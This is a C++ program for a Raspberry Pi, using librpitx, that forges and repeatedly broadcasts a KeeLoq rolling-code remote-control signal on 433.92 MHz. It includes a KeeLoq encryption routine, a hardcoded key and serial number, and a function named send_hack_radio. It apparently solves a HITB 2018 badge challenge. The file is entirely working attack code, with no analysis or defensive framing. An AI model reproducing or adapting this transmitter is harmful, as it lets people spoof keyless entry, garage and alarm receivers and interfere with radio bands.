#include <unistd.h>
#include "librpitx/src/librpitx.h"
#include <iostream>
#include <vector>
#include <cstring>
#include <signal.h>

#define SAMPLE_RATE 4000
#define SAMPLES(n) (1.0 * n * SAMPLE_RATE / 1000000.0)
#define FIFO_SIZE 512

bool running = true;
static void terminate(int num)
{
	running = false;
	std::cerr << "Caught signal " << num << " - Terminating" << std::endl;
}

/* KeeLoq implementation from https://github.com/klks/hitb2018ams_badge. */
#define KeeLoq_NLF 0x3a5c742e
#define bit(x,n) (((x) >> (n)) & 1)
#define g5(x,a,b,c,d,e) (bit(x, a) + bit(x, b) *2 + bit(x, c) * 4 + bit(x, d) * 8 + bit(x, e) * 16)
uint32_t KeeLoq_Encrypt (const uint32_t data, const uint64_t key)
{
	uint32_t x = data;
	for (uint32_t r = 0; r < 528; r++)
	{
		x = (x >> 1) ^ ((bit(x, 0) ^ bit(x, 16) ^ (uint32_t)bit(key, r & 63) ^ bit(KeeLoq_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
	}
	return x;
}

void write_bits(std::vector<float> &data, uint32_t n, uint32_t v)
{
	for (unsigned int i = 0; i < n; ++i)
	{
		unsigned int b = v & (1 << i);
		for (int j = 0; j < (b ? SAMPLES(3500) : SAMPLES(4500)); j++)
			data.push_back(0.0);
		for (int j = 0; j < (b ? SAMPLES(4500) : SAMPLES(3500)); j++)
			data.push_back(1.0);
	}
}

void send_hack_radio(uint64_t freq, uint32_t key, uint32_t sn, uint8_t action)
{
	std::vector<float> data;

	// Sync
	for (int j=0; j < SAMPLES(15000); j++)
		data.push_back(1.0);

	// Pre-amble
	write_bits(data, 12, 0);

	// key, sn, action
	write_bits(data, 32, key);
	write_bits(data, 28, sn);
	write_bits(data, 4, action);

	// Post-amble 
	write_bits(data, 2, 0);

	amdmasync amradio(freq, SAMPLE_RATE, 14, FIFO_SIZE);
	int p = 0;
	while(running)
	{
		usleep((FIFO_SIZE / 2) / SAMPLE_RATE * 1000000.0);
		int available = amradio.GetBufferAvailable();
		int offset = amradio.GetUserMemIndex();
		for (int i = 0; i < available; ++i)
		{
			amradio.SetAmSample(offset + i, data[p]);
			p = (p + 1) % data.size();
		}
	}
	amradio.stop();
}

int main(int argc, char* argv[])
{
	uint64_t freq=433920000;
	if(argc > 1)
	{
		freq = strtoull(argv[1], 0, 10);
	}

	uint32_t key = KeeLoq_Encrypt(0xb3da0000, 0x7D093B66B31C376A);
	uint32_t sn = 0x1337bae;
	uint8_t action = 0;

	std::vector<int> signals = {SIGHUP, SIGINT, SIGQUIT, SIGILL, SIGTRAP, SIGIOT, SIGBUS, SIGFPE,
	                            SIGPIPE, SIGTERM, SIGTSTP};
	for(int signal : signals)
	{	
	        struct sigaction sa;
	        std::memset(&sa, 0, sizeof(sa));
	        sa.sa_handler = terminate;
	        sigaction(signal, &sa, NULL);
	}

	send_hack_radio(freq, key, sn, action);
}	
